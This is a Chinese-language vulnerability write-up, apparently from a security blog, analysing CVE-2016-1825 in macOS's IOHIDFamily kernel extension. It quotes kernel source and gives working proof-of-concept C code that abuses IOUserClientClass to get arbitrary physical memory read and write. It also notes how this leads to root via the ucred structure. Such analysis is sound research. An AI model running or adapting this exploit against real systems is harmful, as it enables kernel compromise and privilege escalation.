> 原文链接: https://www.anquanke.com//post/id/169488 


# CVE-2016-1825浅析：从用户态空间设置IOKit注册属性导致的越权读写物理地址


                                阅读量   
                                **171520**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01597b533d89b9d575.png)](https://p4.ssl.qhimg.com/t01597b533d89b9d575.png)



## 0x001 前言

CVE-2016-1825是IOHIDFamily.kext内核扩展内的一个洞，在OS X 10.11.5以前版本的系统都存在该漏洞，由于允许`IOHIDevice`重新设置`IOUserClientClass`属性，导致任意代码执行。

[![](https://p4.ssl.qhimg.com/t0171ad57afb31071fb.png)](https://p4.ssl.qhimg.com/t0171ad57afb31071fb.png)



## 0x002 调试环境

虚拟机: OS X Yosemite 10.10.5 14F27

主机: macOS Mojave 10.14.2 18C54

内核调试环境的搭建可以参照这一文：

[macOS内核提权：利用CVE-2016-1758获取kernel slide（Part1）](https://www.anquanke.com/post/id/169190)



## 0x003 内核扩展源码分析

在开始分析之前，先来了解一些概念：

1.IOKit？

IOKit是用于设备驱动程序的框架和内核子系统，与IOKit的所有交互都以IOKit主端口开始，这是另一个特殊的机器端口，允许访问IOKit Registry。 IOKit Registry允许用户态程序查找可用的硬件，而设备驱动程序可以通过实现UserClient将接口暴露给用户空间。用户空间实际与IOKit驱动程序的UserClient交互的主要方式是通过`io_connect_method`，此方法由IOKitUser库函数IOConnectCallMethod封装。

2.IOKit Registry？

IOKit Registry实际上是一个驱动程序可以声明键值对的地方（其中键是一个字符串，其值是属于CoreFoundation的数据类型），驱动程序还可以指定其中一些键是可配置的，这意味着从用户空间可以使用IOKit Registry的API来设置新值。

获取macOS kext扩展源码

[[传送门]](https://opensource.apple.com/tarballs/IOPCIFamily/IOPCIFamily-239.10.1.tar.gz)

打开`IOHIDSystem/IOHIDevice.cpp`，找到`IOHIDevice::setProperties`、`IOHIDevice::setParamProperties`方法

```
// RY: Override IORegistryEntry::setProperties().  This will allow properties
// to be set per device, instead of globally via setParamProperties.
IOReturn IOHIDevice::setProperties( OSObject * properties )
`{`
    OSDictionary * propertyDict = OSDynamicCast(OSDictionary, properties);
    IOReturn       ret          = kIOReturnBadArgument;

    if ( propertyDict ) `{`
        if (propertyDict-&gt;setOptions(0, 0) &amp; OSDictionary::kImmutable) `{`
            OSDictionary * temp = propertyDict;
            propertyDict = OSDynamicCast(OSDictionary, temp-&gt;copyCollection());
        `}`
        else `{`
            propertyDict-&gt;retain();
        `}`
        propertyDict-&gt;setObject(kIOHIDDeviceParametersKey, kOSBooleanTrue);
        ret = setParamProperties( propertyDict );
        propertyDict-&gt;removeObject(kIOHIDDeviceParametersKey);
        propertyDict-&gt;release();
    `}`

    return ret;
`}`


IOReturn IOHIDevice::setParamProperties( OSDictionary * dict )
`{`
    IOHIDEventService * eventService = NULL;

    if ( dict-&gt;getObject(kIOHIDEventServicePropertiesKey) == NULL ) `{`
        IOService * service = getProvider();
        if ( service )
            eventService = OSDynamicCast(IOHIDEventService, service);
    `}`

    if ( dict-&gt;getObject(kIOHIDDeviceParametersKey) == kOSBooleanTrue ) `{`
        OSDictionary * deviceParameters = OSDynamicCast(OSDictionary, copyProperty(kIOHIDParametersKey));

        if ( !deviceParameters ) `{`
            deviceParameters = OSDictionary::withCapacity(4);
        `}`
        else `{`
            if (deviceParameters-&gt;setOptions(0, 0) &amp; OSDictionary::kImmutable) `{`
                OSDictionary * temp = deviceParameters;
                deviceParameters = OSDynamicCast(OSDictionary, temp-&gt;copyCollection());
                temp-&gt;release();
            `}`
            else `{`
                // do nothing
            `}`
        `}`

        if ( deviceParameters ) `{`
            // RY: Because K&amp;M Prefs and Admin still expect device props to be
            // top level, let's continue to set them via setProperty. When we get
            // Max to migrate over, we can remove the interator code and use:
            // deviceParameters-&gt;merge(dict);
            // deviceParameters-&gt;removeObject(kIOHIDResetKeyboardKey);
            // deviceParameters-&gt;removeObject(kIOHIDResetPointerKey);
            // setProperty(kIOHIDParametersKey, deviceParameters);
            // deviceParameters-&gt;release();

            OSCollectionIterator * iterator = OSCollectionIterator::withCollection(dict);
            if ( iterator ) `{`
                OSSymbol * key;

                while ( ( key = (OSSymbol *)iterator-&gt;getNextObject() ) )
                    if (    !key-&gt;isEqualTo(kIOHIDResetKeyboardKey) &amp;&amp; 
                            !key-&gt;isEqualTo(kIOHIDResetPointerKey) &amp;&amp; 
                            !key-&gt;isEqualTo(kIOHIDScrollResetKey) &amp;&amp; 
                            !key-&gt;isEqualTo(kIOHIDDeviceParametersKey) &amp;&amp; 
                            !key-&gt;isEqualTo(kIOHIDResetLEDsKey)) `{`
                        OSObject * value = dict-&gt;getObject(key);

                        deviceParameters-&gt;setObject(key, value);
                        setProperty(key, value);
                    `}`

                iterator-&gt;release();
            `}`

            setProperty(kIOHIDParametersKey, deviceParameters);
            deviceParameters-&gt;release();

            // RY: Propogate up to IOHIDEventService level
            if ( eventService )
                eventService-&gt;setSystemProperties(dict);

        `}`
        else `{`
            return kIOReturnNoMemory;
        `}`
    `}`

    return( kIOReturnSuccess );
`}`
```

漏洞点在`IOHIDevice::setParamProperties`方法上，该方法会迭代含有键值对的字典，并对每个健值对调用`setProperty`方法。

打开`IOHIDEventServiceClass`，该处代码重写了`setProperties`方法，以允许用户程序通过调用`IORegistryEntrySetCFProperty`方法，进入`io_registry_entry_set_properties`Mach陷阱设置属性。

[![](https://p4.ssl.qhimg.com/t01b3912b4cd415ec14.png)](https://p4.ssl.qhimg.com/t01b3912b4cd415ec14.png)

这样，我们可以在在IOHIDevice的实例上设置IOUserClientClass客户端类属性，然后会在内核中会分配一个IOUserClient子类，通过相应子类方法可以从用户态操作内核态的数据。示例代码：

```
void physic_init() `{`
    // Get a handle to a service that allows setting arbitrary IORegistry properties.
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching(target_service));
    if (service == IO_OBJECT_NULL) `{`
        printf("could not find any services matching %s", target_service);
    `}`
    kern_return_t kr = IORegistryEntrySetCFProperty(service,
            CFSTR("IOUserClientClass"),
            CFSTR("xxxxxxxx"));
    if (kr != KERN_SUCCESS) `{`
        printf("could not set property: %x", kr);
    `}`
......
`}`
```

打开`IOPCIBridge.cpp`，该方法会new一个`PCIBridge`的client`IOPCIDiagnosticsClient`，用于调试PCI桥，当然这里Alloc相应的内核资源以前会首先检查是否具有管理员权限

[![](https://p0.ssl.qhimg.com/t018e5709d2327f7ac1.png)](https://p0.ssl.qhimg.com/t018e5709d2327f7ac1.png)

再看到`IOPCIDiagnosticsClient::externalMethod`方法，当传入`selector`的参数为`kIOPCIDiagnosticsMethodWrite`，会向物理地址写入数据

[![](https://p5.ssl.qhimg.com/t013aa37d626a12241d.png)](https://p5.ssl.qhimg.com/t013aa37d626a12241d.png)

当传入`selector`的参数为`kIOPCIDiagnosticsMethodRead`，会读出制定物理地址的数据

[![](https://p4.ssl.qhimg.com/t017d272bb5ab728786.png)](https://p4.ssl.qhimg.com/t017d272bb5ab728786.png)

打开`tools/pcidump.c`，找到调用物理内存读写方法的配置。

向物理地址写入

[![](https://p4.ssl.qhimg.com/t0162bf59bddaa1654c.png)](https://p4.ssl.qhimg.com/t0162bf59bddaa1654c.png)

从物理地址读出

[![](https://p0.ssl.qhimg.com/t012e86f5d0f55ca2c0.png)](https://p0.ssl.qhimg.com/t012e86f5d0f55ca2c0.png)



## 0x004 Proof of Concept

现在总结一下以上的分析过程，以及如何利用漏洞读写物理地址：

1.找到`IOHIDevice`这个service，调用`IORegistryEntrySetCFProperty`方法将`IOPCIDiagnosticsClient`设置成`IOUserClientClass`属性。

2.在用户态空间连接上`IOPCIDiagnosticsClient`。

3.配置`IOPCIDiagnosticsParameters`参数，获得对物理地址的读写方法。

编译以下poc代码（已上传到个人Github上[[传送门]](https://github.com/wooy0ung/macos-exploits/tree/master/cve-2016-1825)），部分核心代码：

```
#include &lt;CoreFoundation/CoreFoundation.h&gt;
#include &lt;IOKit/IOKitLib.h&gt;

#include "physic.h"


// Definitions from IOPCIDevice.h
enum `{`
    kIOPCIConfigSpace      = 0,
    kIOPCIIOSpace          = 1,
    kIOPCI32BitMemorySpace = 2,
    kIOPCI64BitMemorySpace = 3
`}`;

// Definitions from IOPCIPrivate.h
enum `{`
    kIOPCIDiagnosticsMethodRead  = 0,
    kIOPCIDiagnosticsMethodWrite = 1,
    kIOPCIDiagnosticsMethodCount
`}`;

struct IOPCIDiagnosticsParameters `{`
    uint32_t options;
    uint32_t spaceType;
    uint32_t bitWidth;
    uint32_t _resv;
    uint64_t value;
    union `{`
        uint64_t addr64;
        struct `{`
            unsigned int offset     :16;
            unsigned int function   :3;
            unsigned int device     :5;
            unsigned int bus        :8;
            unsigned int segment    :16;
            unsigned int reserved   :16;
        `}` pci;
    `}` address;
`}`;


#define TARGET_SERVICE "IOHIDevice"
static const char *target_service = TARGET_SERVICE;

// A connection to an instance of IOPCIDiagnosticsClient through which we can access physical
static io_connect_t connection;

void physic_init() `{`
    // Get a handle to a service that allows setting arbitrary IORegistry properties.
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching(target_service));
    if (service == IO_OBJECT_NULL) `{`
        printf("could not find any services matching %s", target_service);
    `}`
    kern_return_t kr = IORegistryEntrySetCFProperty(service,
            CFSTR("IOUserClientClass"),
            CFSTR("IOPCIDiagnosticsClient"));
    if (kr != KERN_SUCCESS) `{`
        printf("could not set property: %x", kr);
    `}`
    // Create a connection to the IOPCIDiagnosticsClient.
    kr = IOServiceOpen(service, mach_task_self(), 0, &amp;connection);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) `{`
        printf("could not open connection: %x", kr);
    `}`
`}`

uint64_t physic_read(uint64_t paddr, unsigned width) `{`
    struct IOPCIDiagnosticsParameters param;
    param.spaceType      = kIOPCI64BitMemorySpace;
    param.bitWidth       = width * 8;
    param.options        = 0;
    param.address.addr64 = paddr;
    param.value          = -1;
    size_t size = sizeof(param);
    kern_return_t kr = IOConnectCallMethod(connection, kIOPCIDiagnosticsMethodRead,
                                           NULL,       0,
                                           &amp;param,     sizeof(param),
                                           NULL,       NULL,
                                           &amp;param,     &amp;size);
    if (kr != KERN_SUCCESS) `{`
        printf("could not read physical address %p: %x", (void *)paddr, kr);
    `}`
    return param.value;
`}`

void physic_write(uint64_t paddr, uint64_t value, unsigned width) `{`
    struct IOPCIDiagnosticsParameters param;
    param.spaceType      = kIOPCI64BitMemorySpace;
    param.bitWidth       = width * 8;
    param.options        = 0;
    param.address.addr64 = paddr;
    param.value          = value;
    kern_return_t kr = IOConnectCallMethod(connection, kIOPCIDiagnosticsMethodWrite,
                                           NULL,       0,
                                           &amp;param,     sizeof(param),
                                           NULL,       NULL,
                                           NULL,       NULL);
    if (kr != KERN_SUCCESS) `{`
        printf("could not write physical address %p: %x", (void *)paddr, kr);
    `}`
`}`
```

为了验证poc是否能够对物理地址进行读写，我们需要在内核中找一块地，对该处数据进行读写。

查看kernel载入基址

[![](https://p2.ssl.qhimg.com/t016b4724df367c4a04.png)](https://p2.ssl.qhimg.com/t016b4724df367c4a04.png)

查看基址数据，我们选取`0xffffff800c000040`该处地址做读写测试

[![](https://p1.ssl.qhimg.com/t016490838ce4d4baab.png)](https://p1.ssl.qhimg.com/t016490838ce4d4baab.png)

32位的mac系统的物理地址直接就是虚拟地址，而对于64位的mac系统，将虚拟地址略去高32位即可

[![](https://p0.ssl.qhimg.com/t01fb9e98a4647a026c.png)](https://p0.ssl.qhimg.com/t01fb9e98a4647a026c.png)

读取物理地址`0xc000040`，读出来的值与调试器显示的值一致

[![](https://p3.ssl.qhimg.com/t018bc306426de9906c.png)](https://p3.ssl.qhimg.com/t018bc306426de9906c.png)

将数据`0xdeadbeefdeadbeef`写入物理地址`0xc000040`

``[![](https://p1.ssl.qhimg.com/t01e200c96d9a78c95d.png)](https://p1.ssl.qhimg.com/t01e200c96d9a78c95d.png)

回到调试器，查看`0xffffff800c000040`处的数据，写入成功

[![](https://p5.ssl.qhimg.com/t01d3b08cebc396f076.png)](https://p5.ssl.qhimg.com/t01d3b08cebc396f076.png)

现在相当于可以对内核数据任意读写了，更进一步，我们可以将ucred结构的`cr_svuid`设置成0完成提权，关于提权过程这里就不展开了，可以参考这篇文章[[macOS内核提权：利用CVE-2016-1828本地权限提升（Part2） ]](https://www.anquanke.com/post/id/169191)

WIN~

[![](https://p3.ssl.qhimg.com/t01a76ea6b43315a5e8.png)](https://p3.ssl.qhimg.com/t01a76ea6b43315a5e8.png)
